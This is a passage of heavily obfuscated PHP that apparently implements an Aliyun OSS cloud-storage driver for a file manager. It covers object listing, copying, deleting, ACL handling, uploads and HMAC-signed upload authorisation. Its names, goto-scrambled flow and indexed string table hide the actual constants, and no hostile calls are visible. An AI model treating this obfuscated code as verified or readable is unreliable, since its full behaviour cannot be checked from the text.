fileList($DîŒ‡™‘š, $e­Ò´ÚŠ„À = '', $f¸Á¯éŠ¼ = 0) { goto aÔ’è¨Ú; båÊ¡›©ãÖ: $B¦•øêùò» = $CÆ®ÔÅíÚä[33]; $Añ’í²ğ˜Ò = 1000; $FÍÈ Öš¥° = $this->listItemCache === !1 ? !1 : !0; goto aĞ…†¤‡²; aÔ’è¨Ú: $CÆ®ÔÅíÚä =& $_SERVER[œº]; $DîŒ‡™‘š = trim($DîŒ‡™‘š, $CÆ®ÔÅíÚä[8]); $DÑ£›ÜÌØì = empty($DîŒ‡™‘š) && $DîŒ‡™‘š !== $CÆ®ÔÅíÚä[191] ? $CÆ®ÔÅíÚä[33] : $DîŒ‡™‘š . $CÆ®ÔÅíÚä[8]; goto båÊ¡›©ãÖ; F›¹¹é­›: return array($CÆ®ÔÅíÚä[75] => $C‰Øçìøà¸, $CÆ®ÔÅíÚä[74] => $C¾»ö¿²Õ­); goto BĞ„ù˜‹ù®; aĞ…†¤‡²: $C‰Øçìøà¸ = $C¾»ö¿²Õ­ = array(); while (!0) { check_abort(); $BšÑ¿õÖíŒ = array($CÆ®ÔÅíÚä[1271] => $e­Ò´ÚŠ„À, $CÆ®ÔÅíÚä[1272] => $DÑ£›ÜÌØì, $CÆ®ÔÅíÚä[1273] => $Añ’í²ğ˜Ò, $CÆ®ÔÅíÚä[1274] => $B¦•øêùò»); try { $dø½îò“ = $this->client->listObjects($this->bucket, $BšÑ¿õÖíŒ); } catch (OSS\Core\OssException $Bò¿«–£ô÷) { break; } $B¦•øêùò» = $dø½îò“->getNextMarker(); $Cí‚ôÃ—Šè = $dø½îò“->getObjectList(); $F­÷…´‡ä = $dø½îò“->getPrefixList(); foreach ($Cí‚ôÃ—Šè as $aœ§è“´İ÷) { goto Fê—ä¤•À£; aë‘¡ğ­ŞÌ: if ($FÍÈ Öš¥°) { $this->cacheMethod($CÆ®ÔÅíÚä[199], $D¿á‘Ñ­‡—, $D…®Ëó¾½¾); $this->cacheMethod($CÆ®ÔÅíÚä[200], $D¿á‘Ñ­‡—, array($CÆ®ÔÅíÚä[78] => $Fº¡åÄ¹³, $CÆ®ÔÅíÚä[1275] => $Fº¡åÄ¹³, $CÆ®ÔÅíÚä[84] => strtotime($Fá©à°ºÕÏ), $CÆ®ÔÅíÚä[1276] => $Fá©à°ºÕÏ)); } if ($D…®Ëó¾½¾) { $C‰Øçìøà¸[] = $D¿á‘Ñ­‡—; continue; } $C¾»ö¿²Õ­[] = $cãÙ±¶Â; goto fõÌË•ÀÃØ; Fê—ä¤•À£: if ($aœ§è“´İ÷->getKey() == $DÑ£›ÜÌØì) { continue; } $D¿á‘Ñ­‡— = $aœ§è“´İ÷->getKey(); $Fº¡åÄ¹³ = $aœ§è“´İ÷->getSize(); goto A×ÕÀÏ†×ª; A×ÕÀÏ†×ª: $Fá©à°ºÕÏ = $aœ§è“´İ÷->getLastModified(); $cãÙ±¶Â = $f¸Á¯éŠ¼ ? array($CÆ®ÔÅíÚä[28] => $D¿á‘Ñ­‡—, $CÆ®ÔÅíÚä[78] => $Fº¡åÄ¹³, $CÆ®ÔÅíÚä[197] => strtotime($Fá©à°ºÕÏ)) : $D¿á‘Ñ­‡—; $D…®Ëó¾½¾ = $Fº¡åÄ¹³ == 0 && substr($D¿á‘Ñ­‡—, strlen($D¿á‘Ñ­‡—) - 1, 1) == $CÆ®ÔÅíÚä[8] ? !0 : !1; goto aë‘¡ğ­ŞÌ; fõÌË•ÀÃØ: } foreach ($F­÷…´‡ä as $fàÙÆÛ«Ò³) { $C‰Øçìøà¸[] = $fàÙÆÛ«Ò³->getPrefix(); if ($FÍÈ Öš¥°) { $this->cacheMethod($CÆ®ÔÅíÚä[199], $D¿á‘Ñ­‡—, !0); } } if ($B¦•øêùò» === $CÆ®ÔÅíÚä[33]) { break; } } if ($FÍÈ Öš¥°) { $this->cacheMethod($CÆ®ÔÅíÚä[199], $DîŒ‡™‘š, !0); } goto F›¹¹é­›; BĞ„ù˜‹ù®: } public function copyFile($FÔ£Åì™Š, $A·Öæº‰ˆí) { $dÓÈ‚ùÚÃè = $this->size($FÔ£Åì™Š); if ($dÓÈ‚ùÚÃè < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $FÔ£Åì™Š, $this->bucket, $this->pathEncode($A·Öæº‰ˆí)); } catch (OSS\Core\OssException $aÑ„ÒÎù‡) { return !1; } return $this->getPathOuter($A·Öæº‰ˆí); } $e–‹—©¹Ç = $this->multiCopyObject($FÔ£Åì™Š, $A·Öæº‰ˆí, $dÓÈ‚ùÚÃè); return $e–‹—©¹Ç ? $this->getPathOuter($A·Öæº‰ˆí) : !1; } private function multiCopyObject($BÍ™„ÌÓÏ, $d½¡íšßÓô, $cğçèôÄæ‹) { $aœëŞÌ®Ÿ =& $_SERVER[œº]; try { goto dˆš«»â©Ü; DÖÎ“ÒÚÄÓ: $a£ÜİÄÅÜÈ = array(); foreach ($F˜¦êÒ®Ş‡ as $B×¦¿ß‹…» => $aØ×ªñÒÙß) { $a£ÜİÄÅÜÈ[] = array($aœëŞÌ®Ÿ[1281] => $B×¦¿ß‹…» + 1, $aœëŞÌ®Ÿ[1282] => $aØ×ªñÒÙß); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($d½¡íšßÓô), $f¨–É¯¥¬, $a£ÜİÄÅÜÈ); goto e±Ï¨ÔÑ½ï; fòí–¯ˆŸç: $e¡ª“†–õõ = 1; $dÂÇÒ¼„Û = 0; $F˜¦êÒ®Ş‡ = array(); goto F÷ëÏåÀ¡¾; F÷ëÏåÀ¡¾: $BˆÁÔÛÂ‰É = 1024 * 1024 * 10; $b‹‰»ÏšÄê = $this->client->generateMultiuploadParts($cğçèôÄæ‹, $BˆÁÔÛÂ‰É); foreach ($b‹‰»ÏšÄê as $B×¦¿ß‹…» => $fô–‘ìºÏ²) { $BÎ³¾çæ“  = $dÂÇÒ¼„Û + (int) $fô–‘ìºÏ²[$aœëŞÌ®Ÿ[1278]]; $cÀğØ¶éÊ = (int) $fô–‘ìºÏ²[$aœëŞÌ®Ÿ[335]] + $BÎ³¾çæ“  - 1; $fƒ¯Ö…Ÿ‰¹ = array($aœëŞÌ®Ÿ[1279] => $BÎ³¾çæ“ , $aœëŞÌ®Ÿ[1280] => $cÀğØ¶éÊ); $F˜¦êÒ®Ş‡[] = $this->client->uploadPartCopy($this->bucket, $BÍ™„ÌÓÏ, $this->bucket, $this->pathEncode($d½¡íšßÓô), $e¡ª“†–õõ, $f¨–É¯¥¬, $fƒ¯Ö…Ÿ‰¹); $e¡ª“†–õõ = $e¡ª“†–õõ + 1; } goto DÖÎ“ÒÚÄÓ; dˆš«»â©Ü: $eˆˆ„¡¾Íá = array(); if ($e¼±ë‰õŠ» = $this->hashMd5($BÍ™„ÌÓÏ)) { $eˆˆ„¡¾Íá = array(OSS\OssClient::OSS_HEADERS => array($aœëŞÌ®Ÿ[1277] => $e¼±ë‰õŠ»)); } $f¨–É¯¥¬ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($d½¡íšßÓô), $eˆˆ„¡¾Íá); goto fòí–¯ˆŸç; e±Ï¨ÔÑ½ï: } catch (OSS\Core\OssException $C‚ˆ­ÏÛ…) { return !1; } return !0; } public function moveFile($a‘†Î¨•°, $Cİ”ôŒ—¾) { if ($this->copyFile($a‘†Î¨•°, $Cİ”ôŒ—¾)) { $this->remove($a‘†Î¨•°); return $this->getPathOuter($Cİ”ôŒ—¾); } return !1; } public function delFile($d‹ÚÇ‘¡Çí) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($d‹ÚÇ‘¡Çí)); } catch (OSS\Core\OssException $a­ï®’ìà) { return !1; } return !0; } public function delFolder($B®¢‹õ°Áó) { goto a‡åÖØÑ¥Ù; a‡åÖØÑ¥Ù: $C±½“åˆš =& $_SERVER[œº]; if (!$this->exist($B®¢‹õ°Áó)) { return !0; } $this->listItemCache = !1; goto f”ÀêÙœï; f”ÀêÙœï: $E¬åĞâçÊ’ = $this->fileList($B®¢‹õ°Áó); $this->listItemCache = !0; $f•÷Ñøô¼ = trim($B®¢‹õ°Áó, $C±½“åˆš[8]) . $C±½“åˆš[8]; goto DéÀÀèï®…; DéÀÀèï®…: if (!empty($B®¢‹õ°Áó) && $B®¢‹õ°Áó !== $C±½“åˆš[191] && !in_array($f•÷Ñøô¼, $E¬åĞâçÊ’[$C±½“åˆš[75]])) { $E¬åĞâçÊ’[$C±½“åˆš[75]][] = $f•÷Ñøô¼; } $FµÖÀ…‘ = $this->delByBatch($E¬åĞâçÊ’[$C±½“åˆš[74]]); if (!$FµÖÀ…‘) { return !1; } goto eµ„Ç²öÁ; eµ„Ç²öÁ: $FµÖÀ…‘ = $this->delByBatch($E¬åĞâçÊ’[$C±½“åˆš[75]]); if (!$FµÖÀ…‘) { return !1; } return $this->delFile($f•÷Ñøô¼); goto fæÆ¥†”ê˜; fæÆ¥†”ê˜: } private function delByBatch($B¥ğò›ïñÏ) { foreach (array_chunk($B¥ğò›ïñÏ, 1000) as $a¦Í§ŒíË) { try { $this->client->deleteObjects($this->bucket, $a¦Í§ŒíË); } catch (OSS\Core\OssException $FÇÛ÷´î¥÷) { return !1; } } return !0; } public function rename($fê±îî¿âª, $EĞÓİ‹õ¾˜) { return $this->renameObject($fê±îî¿âª, $EĞÓİ‹õ¾˜); } private function fileInfo($Cß…•ê¦­, $FøÎº…£Ê— = false, $F·µò–êíæ = array()) { goto cíßŞä˜îñ; b¢á†÷æÁ: if (isset($F·µò–êíæ[$f˜‰•›ÊçË[78]])) { $E”âš‚Û¨²[$f˜‰•›ÊçË[78]] = $F·µò–êíæ[$f˜‰•›ÊçË[78]]; } if (isset($F·µò–êíæ[$f˜‰•›ÊçË[84]])) { $E”âš‚Û¨²[$f˜‰•›ÊçË[84]] = $F·µò–êíæ[$f˜‰•›ÊçË[84]]; } if (isset($F·µò–êíæ[$f˜‰•›ÊçË[197]]) && !trim($E”âš‚Û¨²[$f˜‰•›ÊçË[84]])) { $E”âš‚Û¨²[$f˜‰•›ÊçË[84]] = $F·µò–êíæ[$f˜‰•›ÊçË[197]]; } goto B¢Ğ¦ĞÉµˆ; B¢Ğ¦ĞÉµˆ: return $E”âš‚Û¨²; goto dæ´åö§¼; DÄ†ñó: $E”âš‚Û¨²[$f˜‰•›ÊçË[194]] = $E”âš‚Û¨²[$f˜‰•›ÊçË[84]] = 0; $E”âš‚Û¨²[$f˜‰•›ÊçË[195]] = $E”âš‚Û¨²[$f˜‰•›ÊçË[196]] = !0; if (empty($F·µò–êíæ)) { $CŒ”ãÖ©İ = $this->objectMeta($Cß…•ê¦­); if (!$CŒ”ãÖ©İ) { return $E”âš‚Û¨²; } $F·µò–êíæ = array($f˜‰•›ÊçË[84] => strtotime($CŒ”ãÖ©İ[$f˜‰•›ÊçË[1276]]), $f˜‰•›ÊçË[78] => $CŒ”ãÖ©İ[$f˜‰•›ÊçË[1275]] + 0); } goto b¢á†÷æÁ; cíßŞä˜îñ: $f˜‰•›ÊçË =& $_SERVER[œº]; $E”âš‚Û¨² = array($f˜‰•›ÊçË[28] => $this->pathThis($Cß…•ê¦­), $f˜‰•›ÊçË[76] => $this->getPathOuter($Cß…•ê¦­), $f˜‰•›ÊçË[29] => $f˜‰•›ÊçË[193], $f˜‰•›ÊçË[78] => isset($F·µò–êíæ[$f˜‰•›ÊçË[78]]) ? $F·µò–êíæ[$f˜‰•›ÊçË[78]] : 0, $f˜‰•›ÊçË[168] => $this->ext($Cß…•ê¦­)); if ($FøÎº…£Ê—) { return $E”âš‚Û¨²; } goto DÄ†ñó; dæ´åö§¼: } private function folderInfo($eÁÃ·¾Îœ, $B¿­ÑÀÆÅà = false, $däå‰ìÅ = array()) { goto aêÌÎÜ•éË; aêÌÎÜ•éË: $BÅš­·×ˆ =& $_SERVER[œº]; $eš™¼‚†¹‘ = array($BÅš­·×ˆ[28] => $this->pathThis($eÁÃ·¾Îœ), $BÅš­·×ˆ[76] => $this->getPathOuter($BÅš­·×ˆ[8] . $eÁÃ·¾Îœ), $BÅš­·×ˆ[29] => $BÅš­·×ˆ[77]); if ($B¿­ÑÀÆÅà) { return $eš™¼‚†¹‘; } goto AÉÎ½ïİ‹¤; d·Ç‡õšÆ¿: if (isset($däå‰ìÅ[$BÅš­·×ˆ[84]])) { $eš™¼‚†¹‘[$BÅš­·×ˆ[84]] = $däå‰ìÅ[$BÅš­·×ˆ[84]]; } if (isset($däå‰ìÅ[$BÅš­·×ˆ[194]])) { $eš™¼‚†¹‘[$BÅš­·×ˆ[194]] = $däå‰ìÅ[$BÅš­·×ˆ[194]]; } return $eš™¼‚†¹‘; goto cŒ‹é¼©Ğ; AÉÎ½ïİ‹¤: $eš™¼‚†¹‘[$BÅš­·×ˆ[194]] = $eš™¼‚†¹‘[$BÅš­·×ˆ[84]] = 0; $eš™¼‚†¹‘[$BÅš­·×ˆ[195]] = $eš™¼‚†¹‘[$BÅš­·×ˆ[196]] = !0; if (empty($däå‰ìÅ)) { $eÁÃ·¾Îœ = rtrim($eÁÃ·¾Îœ, $BÅš­·×ˆ[8]) . $BÅš­·×ˆ[8]; $EöÚ¦ô¤İ  = $this->objectMeta($eÁÃ·¾Îœ); if (!$EöÚ¦ô¤İ ) { return $eš™¼‚†¹‘; } $däå‰ìÅ = array($BÅš­·×ˆ[194] => $EöÚ¦ô¤İ [$BÅš­·×ˆ[1283]][$BÅš­·×ˆ[1284]], $BÅš­·×ˆ[84] => strtotime($EöÚ¦ô¤İ [$BÅš­·×ˆ[1276]])); } goto d·Ç‡õšÆ¿; cŒ‹é¼©Ğ: } public function listPath($FÂÍ½¸£œŒ, $C°ï„ƒÁ¶— = false) { $FÒùÃñŞ—Æ =& $_SERVER[œº]; $E„î¹­Í¶ = $this->fileList($FÂÍ½¸£œŒ, $FÒùÃñŞ—Æ[8], !0); foreach ($E„î¹­Í¶[$FÒùÃñŞ—Æ[75]] as $a´ªàñºŠÉ => $EÉêá»ìÙÜ) { $E„î¹­Í¶[$FÒùÃñŞ—Æ[75]][$a´ªàñºŠÉ] = $this->folderInfo($EÉêá»ìÙÜ, $C°ï„ƒÁ¶—, $EÉêá»ìÙÜ); } foreach ($E„î¹­Í¶[$FÒùÃñŞ—Æ[74]] as $a´ªàñºŠÉ => $EÉêá»ìÙÜ) { $E„î¹­Í¶[$FÒùÃñŞ—Æ[74]][$a´ªàñºŠÉ] = $this->fileInfo($EÉêá»ìÙÜ[$FÒùÃñŞ—Æ[28]], $C°ï„ƒÁ¶—, $EÉêá»ìÙÜ); } return $E„î¹­Í¶; } public function has($b²™¹›èÂµ, $C˜ƒ¶¬˜³ƒ = false, $e¡Á„’‹«è = true) { goto f›ƒÏÙ­¦; f›ƒÏÙ­¦: $e„Œ¯‡¥§Í =& $_SERVER[œº]; $b²™¹›èÂµ = trim($b²™¹›èÂµ, $e„Œ¯‡¥§Í[8]); $aÜ×’÷¡ªä = empty($b²™¹›èÂµ) && $b²™¹›èÂµ !== $e„Œ¯‡¥§Í[191] ? $e„Œ¯‡¥§Í[33] : $b²™¹›èÂµ . $e„Œ¯‡¥§Í[8]; goto FÖ›°¤‰ïâ; C£Æ°Ü‹¨: while (!0) { check_abort(); $f Ğºñ²³è = array($e„Œ¯‡¥§Í[1271] => $e„Œ¯‡¥§Í[8], $e„Œ¯‡¥§Í[1272] => $aÜ×’÷¡ªä, $e„Œ¯‡¥§Í[1273] => $a·¶­¶Ş› , $e„Œ¯‡¥§Í[1274] => $d‘ÉÀ¸®õ); try { $d‰Õæ¥©¬™ = $this->client->listObjects($this->bucket, $f Ğºñ²³è); } catch (OSS\Core\OssException $d‰“ÀñïñÌ) { break; } $d‘ÉÀ¸®õ = $d‰Õæ¥©¬™->getNextMarker(); $eÑ‚¢à‹ó = $d‰Õæ¥©¬™->getObjectList(); $A¡•ğë¤‡ = $d‰Õæ¥©¬™->getPrefixList(); if ($C˜ƒ¶¬˜³ƒ) { if (count($eÑ‚¢à‹ó) > 1 || count($eÑ‚¢à‹ó) == 1 && $eÑ‚¢à‹ó[0]->getKey() != $aÜ×’÷¡ªä) { $f†ï ™‡­¨ += count($eÑ‚¢à‹ó) - 1; } if (!empty($A¡•ğë¤‡)) { $F…ˆË“Âª‚ += count($A¡•ğë¤‡); } if ($d‘ÉÀ¸®õ === $e„Œ¯‡¥§Í[33]) { break; } continue; } if ($e¡Á„’‹«è) { if (!empty($eÑ‚¢à‹ó)) { if (count($eÑ‚¢à‹ó) > 1 || $eÑ‚¢à‹ó[0]->getKey() != $aÜ×’÷¡ªä) { return !0; } } } else { if (!empty($A¡•ğë¤‡)) { return !0; } } if ($d‘ÉÀ¸®õ === $e„Œ¯‡¥§Í[33]) { break; } } if ($C˜ƒ¶¬˜³ƒ) { return array($e„Œ¯‡¥§Í[203] => $f†ï ™‡­¨, $e„Œ¯‡¥§Í[204] => $F…ˆË“Âª‚); } return !1; goto dÓÌ™¢¬ÏÁ; FÖ›°¤‰ïâ: $d‘ÉÀ¸®õ = $e„Œ¯‡¥§Í[33]; $a·¶­¶Ş›  = 500; $f†ï ™‡­¨ = $F…ˆË“Âª‚ = 0; goto C£Æ°Ü‹¨; dÓÌ™¢¬ÏÁ: } public function listAll($f„åØ¶Û‡İ) { $A‹¢ç„‡É =& $_SERVER[œº]; $cÄ›ç½˜‹¸ = $this->fileList($f„åØ¶Û‡İ, $A‹¢ç„‡É[33], !0); $a§†Àì«ÚÌ = array(); foreach ($cÄ›ç½˜‹¸[$A‹¢ç„‡É[74]] as $fé˜‹‹…¥°) { $a§†Àì«ÚÌ[$fé˜‹‹…¥°[$A‹¢ç„‡É[28]]] = $fé˜‹‹…¥°[$A‹¢ç„‡É[78]]; } foreach ($cÄ›ç½˜‹¸[$A‹¢ç„‡É[75]] as $fé˜‹‹…¥°) { if (is_string($fé˜‹‹…¥°)) { $a§†Àì«ÚÌ[$fé˜‹‹…¥°] = 0; } } return $this->listAllFiles($f„åØ¶Û‡İ, array_keys($a§†Àì«ÚÌ), $a§†Àì«ÚÌ); } public function canRead($BÃÛ¶½ö¥ö) { $bì ø±Òç¿ =& $_SERVER[œº]; $D½ÓÚ¨µè = $this->pathAcl($BÃÛ¶½ö¥ö); return $D½ÓÚ¨µè == $bì ø±Òç¿[1285] || $D½ÓÚ¨µè == $bì ø±Òç¿[519] ? !0 : !1; } public function canWrite($Aé¤–ìñÄ) { $a‚ÎÀ«Ê¯ = $this->pathAcl($Aé¤–ìñÄ); return $a‚ÎÀ«Ê¯ == $_SERVER[œº][519] ? !0 : !1; } public function pathAcl($aÏ¹Œ¦–‘£) { goto bİÜÙÍŠµ¡; bİÜÙÍŠµ¡: $Aö‚È¾Øäí =& $_SERVER[œº]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $a´¤ÁÉØ„  = $this->client->getObjectAcl($this->bucket, $this->pathEncode($aÏ¹Œ¦–‘£)); } catch (OSS\Core\OssException $AÁñ„ĞÖ¼š) { return !1; } goto böÑÍæ’å×; böÑÍæ’å×: $dÃ¨ƒøù¾Ä = $a´¤ÁÉØ„  == $Aö‚È¾Øäí[34] ? $this->bucketAcl : $a´¤ÁÉØ„ ; if ($dÃ¨ƒøù¾Ä == $Aö‚È¾Øäí[1286]) { return $Aö‚È¾Øäí[1285]; } if ($dÃ¨ƒøù¾Ä == $Aö‚È¾Øäí[1287]) { return $Aö‚È¾Øäí[519]; } goto e±¾å·Ø„ß; e±¾å·Ø„ß: return $dÃ¨ƒøù¾Ä; goto aç„¿í­š; aç„¿í­š: } private function chmodPath($Dª³Ï¬Ÿ“£, $F³èªƒç = '') { $eàÜÅŞîµÜ =& $_SERVER[œº]; $fò§³éªôŸ = empty($F³èªƒç) ? $eàÜÅŞîµÜ[1287] : $F³èªƒç; $A”ØÅß»² = array($eàÜÅŞîµÜ[34], $eàÜÅŞîµÜ[192], $eàÜÅŞîµÜ[1286], $eàÜÅŞîµÜ[1287]); if (!in_array($fò§³éªôŸ, $A”ØÅß»²)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Dª³Ï¬Ÿ“£), $fò§³éªôŸ); } catch (OSS\Core\OssException $EÏæ­ñ…ˆ¿) { return !1; } return !0; } public function getContent($Eí‡À×Ç¶) { return $this->fileSubstr($Eí‡À×Ç¶, -1); } public function setContent($eÏŞ—ßÈé§, $dª‚…Á‘Œ– = '') { $Fé¹§ã´³£ =& $_SERVER[œº]; try { $AÛ›…ôÇ· = $this->trafficLimit($Fé¹§ã´³£[1288]); $b™ˆ‘•‹…ù = $this->client->putObject($this->bucket, $this->pathEncode($eÏŞ—ßÈé§), $dª‚…Á‘Œ–, $AÛ›…ôÇ·); } catch (OSS\Core\OssException $eÍ¡ëœìÃ‹) { return !1; } $bŞÛ’öèà¸ = array($Fé¹§ã´³£[1277] => trim($b™ˆ‘•‹…ù[$Fé¹§ã´³£[1289]], $Fé¹§ã´³£[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($eÏŞ—ßÈé§))); $this->updateObjMeta($eÏŞ—ßÈé§, $bŞÛ’öèà¸); return isset($b™ˆ‘•‹…ù[$Fé¹§ã´³£[1290]][$Fé¹§ã´³£[1236]]) ? !0 : !1; } private function updateObjMeta($A‹­î¥ÂÔ, $Fİ‘—Ğô‚) { $A‹­î¥ÂÔ = $this->pathEncode($A‹­î¥ÂÔ); try { $d“ï¥¹ˆèŞ = array(OSS\OssClient::OSS_HEADERS => $Fİ‘—Ğô‚); $this->client->copyObject($this->bucket, $A‹­î¥ÂÔ, $this->bucket, $A‹­î¥ÂÔ, $d“ï¥¹ˆèŞ); } catch (OSS\Core\OssException $fªŠÍ„æÈ±) { return !1; } return !0; } public function upload($cÏƒÉ·‡÷, $e¶Ğ²òÛÌĞ, $b¼»œù½ = false, $c’’–ˆÂÉ = REPEAT_REPLACE) { $E´ñÂ£ö‹ =& $_SERVER[œº]; $e†‘£²§Ò = trim($cÏƒÉ·‡÷, $E´ñÂ£ö‹[8]); $Dî„ßîãÔ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($E´ñÂ£ö‹[1277] => @md5_file($e¶Ğ²òÛÌĞ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($cÏƒÉ·‡÷))); $Dî„ßîãÔ = $this->trafficLimit($E´ñÂ£ö‹[1288], $Dî„ßîãÔ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($e†‘£²§Ò), $e¶Ğ²òÛÌĞ, $Dî„ßîãÔ); } catch (OSS\Core\OssException $dœà™×Æ ) { return !1; } return $this->getPathOuter($cÏƒÉ·‡÷); } public function getHost() { $Bì—è›ƒ» =& $_SERVER[œº]; $cŠÊˆ“İ°İ = explode($Bì—è›ƒ»[177], parent::getHost()); return $cŠÊˆ“İ°İ[0] . $Bì—è›ƒ»[177] . $this->bucket . $Bì—è›ƒ»[95] . $cŠÊˆ“İ°İ[1]; } public function uploadFormData($BµÃè”ë¶Ö, $f‹±‡±Âçà = 3600) { goto AÀÚ–³†…; DÂ…–§ùñ¯: $dßµØ¸µÆô = strpos($d¬„ğ¿‘ˆµ, $Aã””à•ç·[294]); $d¬„ğ¿‘ˆµ = substr($d¬„ğ¿‘ˆµ, 0, $dßµØ¸µÆô) . $Aã””à•ç·[1292]; $CíìßÔ†Àƒ = 1048576000 * 5; goto EÎ©Ø„ÊÄƒ; Aæ¥“Ä†Ø: $AÆˆ‹ÚŠ±ƒ = date($Aã””à•ç·[1291], time() + $b³óí†òìº); $DİÅĞ»®»Õ = new DateTime($AÆˆ‹ÚŠ±ƒ); $d¬„ğ¿‘ˆµ = $DİÅĞ»®»Õ->format(DateTime::ISO8601); goto DÂ…–§ùñ¯; EÎ©Ø„ÊÄƒ: $d´Õí‰ªĞ¢ = $this->pathFather($BµÃè”ë¶Ö); $aµ’âÓĞ“ = array($Aã””à•ç·[1191] => $d¬„ğ¿‘ˆµ, $Aã””à•ç·[1192] => array(array($Aã””à•ç·[1293], 0, $CíìßÔ†Àƒ), array($Aã””à•ç·[1195], $Aã””à•ç·[1196], $d´Õí‰ªĞ¢))); $EåéÃ¿Û¢ = base64_encode(json_encode($aµ’âÓĞ“)); goto cÛá¥øÇÍ¹; cÛá¥øÇÍ¹: $E—¹¨¢ª„Ü = base64_encode(hash_hmac($Aã””à•ç·[230], $EåéÃ¿Û¢, $this->secret, !0)); $E ©ñãÓ´± = array($Aã””à•ç·[1201] => $EåéÃ¿Û¢, $Aã””à•ç·[1294] => $this->accessKey, $Aã””à•ç·[1197] => $Aã””à•ç·[1189], $Aã””à•ç·[1295] => $E—¹¨¢ª„Ü, $Aã””à•ç·[175] => $C’æ é¶ç·); $E ©ñãÓ´± = $this->trafficLimit($Aã””à•ç·[1288], $E ©ñãÓ´±); goto c½¥ÆÂÖ—‘; AÀÚ–³†…: $Aã””à•ç· =& $_SERVER[œº]; if (!($C’æ é¶ç· = $this->getHost())) { return !1; } $b³óí†òìº = $f‹±‡±Âçà; goto Aæ¥“Ä†Ø; c½¥ÆÂÖ—‘: return $E ©ñãÓ´±; goto a‹¢Ë×Û‚; a‹¢Ë×Û‚: } public function multiUploadFormData($a©Ë„äğ·¼, $b¸ÅÃ•£‚ç = 3600) { $e·ƒİÚ³°í =& $_SERVER[œº]; if (!($A†¡„’Ï˜Ÿ = $this->getHost())) { return !1; } $D†¯‰ÛÈ‘ = $this->trafficLimit($e·ƒİÚ³°í[1288]); $dº¯à‚ª¥— = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($a©Ë„äğ·¼), $D†¯‰ÛÈ‘); return array($e·ƒİÚ³°í[221] => $dº¯à‚ª¥—, $e·ƒİÚ³°í[175] => $A†¡„’Ï˜Ÿ . $e·ƒİÚ³°í[8] . $this->pathEncode($a©Ë„äğ·¼), $e·ƒİÚ³°í[222] => gmdate($e·ƒİÚ³°í[1296]), $e·ƒİÚ³°í[93] => $a©Ë„äğ·¼); } public function multiUploadAuthData($EŞ¬ßù»¬—, $CÃÛÓãÚ— = array()) { goto c£çĞÚ…¼; Bøï¦ëœ¹: $dÎ×òÁ‚ç = $DÅÓ­÷Ö[1261] . $this->accessKey . $DÅÓ­÷Ö[4] . $B‚õƒÚçº§; if (strpos($aŒÆ–Ğóñ½, $DÅÓ­÷Ö[225]) === 0) { $dÎ×òÁ‚ç = array($DÅÓ­÷Ö[232] => $dÎ×òÁ‚ç, $DÅÓ­÷Ö[222] => $AƒˆŠ¡óƒ¦); if ($dÇÔùÅçÆ‘) { $dÎ×òÁ‚ç = array_merge($dÎ×òÁ‚ç, $dÇÔùÅçÆ‘); } } return $dÎ×òÁ‚ç; goto fäÀ­‘å‹‚; B…éĞŒòåÕ: $dŠ©•ƒâÙõ = array($DÅÓ­÷Ö[224], $DÅÓ­÷Ö[33], $DÅÓ­÷Ö[119], $AƒˆŠ¡óƒ¦, "\170\x2d\157\x73\163\55\144\141\164\145\72{$AƒˆŠ¡óƒ¦}", $DÅÓ­÷Ö[8] . $this->bucket . $DÅÓ­÷Ö[8] . $E”œĞ†¤£ù . $aŒÆ–Ğóñ½); if (strpos($aŒÆ–Ğóñ½, $DÅÓ­÷Ö[225]) === 0) { $dŠ©•ƒâÙõ[0] = $DÅÓ­÷Ö[226]; if ($dÇÔùÅçÆ‘ = $this->trafficLimit($DÅÓ­÷Ö[1288])) { $E”œĞ†¤£ù = $DÅÓ­÷Ö[1297]; array_splice($dŠ©•ƒâÙõ, 5, 0, $E”œĞ†¤£ù . $DÅÓ­÷Ö[4] . $dÇÔùÅçÆ‘[$E”œĞ†¤£ù]); } } if (isset($CÃÛÓãÚ—[$DÅÓ­÷Ö[227]]) && $CÃÛÓãÚ—[$DÅÓ­÷Ö[227]] == $DÅÓ­÷Ö[228]) { $dŠ©•ƒâÙõ[0] = $DÅÓ­÷Ö[228]; } goto FíÅ¯‡¤; FíÅ¯‡¤: if (!empty($CÃÛÓãÚ—[$DÅÓ­÷Ö[1298]])) { $a¸•ŒØÑ™ø = array_merge(array($dŠ©•ƒâÙõ[4]), $CÃÛÓãÚ—[$DÅÓ­÷Ö[1298]]); sort($a¸•ŒØÑ™ø); $dŠ©•ƒâÙõ[4] = implode($DÅÓ­÷Ö[229], $a¸•ŒØÑ™ø); } $c†™µ÷àÍ‹ = implode($DÅÓ­÷Ö[229], $dŠ©•ƒâÙõ); $B‚õƒÚçº§ = base64_encode(hash_hmac($DÅÓ­÷Ö[230], $c†™µ÷àÍ‹, $this->secret, !0)); goto Bøï¦ëœ¹; b–‹ÒŒ”Õª: $E”œĞ†¤£ù = $EŞ¬ßù»¬—; if (isset($CÃÛÓãÚ—[$DÅÓ­÷Ö[93]])) { $E”œĞ†¤£ù = $CÃÛÓãÚ—[$DÅÓ­÷Ö[93]]; unset($CÃÛÓãÚ—[$DÅÓ­÷Ö[93]]); } if (isset($CÃÛÓãÚ—[$DÅÓ­÷Ö[223]])) { $CÃÛÓãÚ—[$DÅÓ­÷Ö[222]] = $AƒˆŠ¡óƒ¦; return $this->listUploadParts($E”œĞ†¤£ù, $CÃÛÓãÚ—); } goto B…éĞŒòåÕ; c£çĞÚ…¼: $DÅÓ­÷Ö =& $_SERVER[œº]; $AƒˆŠ¡óƒ¦ = isset($CÃÛÓãÚ—[$DÅÓ­÷Ö[222]]) ? $CÃÛÓãÚ—[$DÅÓ­÷Ö[222]] : gmdate($DÅÓ­÷Ö[1296]); $aŒÆ–Ğóñ½ = isset($CÃÛÓãÚ—[$DÅÓ­÷Ö[168]]) ? 